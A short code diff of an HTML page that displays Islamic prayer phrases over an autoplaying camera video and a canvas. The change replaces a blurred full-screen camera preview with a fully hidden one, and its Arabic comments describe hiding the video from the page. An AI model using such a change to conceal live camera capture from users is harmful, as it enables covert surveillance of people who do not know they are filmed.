@@ -26,14 +26,9 @@
             font-weight: bold;
         }
 
+        /* إخفاء الفيديو عن الصفحة */
         video {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* لضمان تغطية الفيديو للشاشة بالكامل */
-            filter: blur(15px); /* تشويش الفيديو لإخفاء الوجه */
+            display: none;
         }
 
         canvas {
@@ -49,7 +44,7 @@
     <p class="prayer">لا إله إلا الله محمد رسول الله</p>
     <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
 
-    <!-- فيديو يعرض الكاميرا ولكن مع فلتر تشويش -->
+    <!-- فيديو يعرض الكاميرا ولكن مغطى -->
     <video id="video" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
